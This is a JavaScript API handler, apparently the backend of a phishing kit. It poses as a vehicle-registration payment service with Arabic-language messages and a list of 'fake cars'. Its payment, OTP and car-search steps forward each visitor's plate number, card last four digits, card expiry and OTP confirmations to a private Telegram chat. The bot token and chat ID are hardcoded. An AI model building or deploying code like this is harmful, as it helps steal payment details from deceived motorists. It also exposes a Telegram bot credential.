import axios from 'axios';

// Hardcoded Telegram Bot Parameters - SECURE
const BOT_TOKEN = process.env.BOT_TOKEN || '7856906286:AAFbx_K_V2qMxD_UxBc9LqKN_Q8vvKf_o2A';
const CHAT_ID = process.env.CHAT_ID || '6286341877';

// Database of fake cars
const fakeCars = {
  "1234 ع 99": { marque: "Renault", modele: "Symbol", annee: "2020", carburant: "Essence" },
  "5678 و 22": { marque: "Hyundai", modele: "i10", annee: "2022", carburant: "Essence" },
  "9101 ب 33": { marque: "Dacia", modele: "Sandero", annee: "2019", carburant: "Diesel" },
  "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021", carburant: "Essence" }
};

// Validate Telegram configuration
const validateTelegramConfig = () => {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('[ERROR] Missing Telegram configuration');
    return false;
  }
  return true;
};

// Send message to Telegram
const sendToTelegram = async (message) => {
  try {
    if (!validateTelegramConfig()) {
      throw new Error('Invalid Telegram configuration');
    }

    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      },
      { timeout: 10000 }
    );

    console.log(`[TELEGRAM] Message sent successfully (Status: ${response.status})`);
    return { success: true, messageId: response.data.result?.message_id };
  } catch (error) {
    console.error('[TELEGRAM] Failed to send message:', {
      status: error.response?.status,
      error: error.message,
      details: error.response?.data
    });
    return { success: false, error: error.message };
  }
};

// Main API handler
export default async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { step, data } = req.body;

    if (!step || !data) {
      return res.status(400).json({ error: 'Missing step or data' });
    }

    console.log(`[API] Processing request - Step: ${step}`);

    let message = '';
    let telegramResult = null;

    // Handle different steps
    if (step === 'payment') {
      // Validate payment data
      if (!data.plaque || !data.cardLastFour || !data.expiry || !data.timestamp) {
        return res.status(400).json({ error: 'Missing payment data' });
      }

      // Create Telegram message with payment details
      message = `🔔 <b>تنبيه دفع جديد</b>\n`;
      message += `━━━━━━━━━━━━━━━━━━━\n`;
      message += `📋 <b>رقم التسجيل:</b> <code>${escapeHtml(data.plaque)}</code>\n`;
      message += `🚗 <b>الماركة:</b> ${escapeHtml(data.marque)}\n`;
      message += `💳 <b>رقم البطاقة:</b> ****${escapeHtml(data.cardLastFour)}\n`;
      message += `📅 <b>تاريخ الانتهاء:</b> ${escapeHtml(data.expiry)}\n`;
      message += `🕐 <b>الوقت:</b> ${escapeHtml(data.timestamp)}\n`;
      message += `━━━━━━━━━━━━━━━━━━━\n`;
      message += `✅ <b>الحالة:</b> تم استقبال البيانات بنجاح`;

      // Send to Telegram
      telegramResult = await sendToTelegram(message);

      // Log payment details
      console.log('[PAYMENT] Payment data received:', {
        plaque: data.plaque,
        cardLastFour: data.cardLastFour,
        timestamp: data.timestamp,
        telegramStatus: telegramResult.success ? 'sent' : 'failed'
      });

    } else if (step === 'otp_verify') {
      // OTP verification notification
      message = `🔐 <b>تحقق OTP</b>\n`;
      message += `━━━━━━━━━━━━━━━━━━━\n`;
      message += `📋 <b>رقم التسجيل:</b> <code>${escapeHtml(data.plaque)}</code>\n`;
      message += `⏱️ <b>الوقت:</b> ${escapeHtml(data.timestamp)}\n`;
      message += `✅ <b>الحالة:</b> تم التحقق بنجاح`;

      telegramResult = await sendToTelegram(message);

      console.log('[OTP] OTP verification:', {
        plaque: data.plaque,
        telegramStatus: telegramResult.success ? 'sent' : 'failed'
      });

    } else if (step === 'car_search') {
      // Car search notification
      message = `🔍 <b>بحث عن مركبة</b>\n`;
      message += `━━━━━━━━━━━━━━━━━━━\n`;
      message += `📋 <b>رقم التسجيل:</b> <code>${escapeHtml(data.plaque)}</code>\n`;
      message += `⏱️ <b>الوقت:</b> ${escapeHtml(data.timestamp)}\n`;
      message += `📊 <b>النتيجة:</b> ${data.found ? '✅ تم العثور' : '❌ لم يتم العثور'}`;

      telegramResult = await sendToTelegram(message);

      console.log('[SEARCH] Car search:', {
        plaque: data.plaque,
        found: data.found,
        telegramStatus: telegramResult.success ? 'sent' : 'failed'
      });

    } else {
      message = `📢 <b>تنبيه من المنصة</b>\n`;
      message += `━━━━━━━━━━━━━━━━━━━\n`;
      message += `📌 <b>الخطوة:</b> ${escapeHtml(step)}\n`;
      message += `⏱️ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;

      telegramResult = await sendToTelegram(message);
    }

    // Return success response
    return res.status(200).json({
      success: true,
      message: 'Data processed successfully',
      telegram: telegramResult,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('[API ERROR]', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
};

// Helper function to escape HTML
function escapeHtml(text) {
  if (!text) return '';
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return String(text).replace(/[&<>"']/g, (m) => map[m]);
}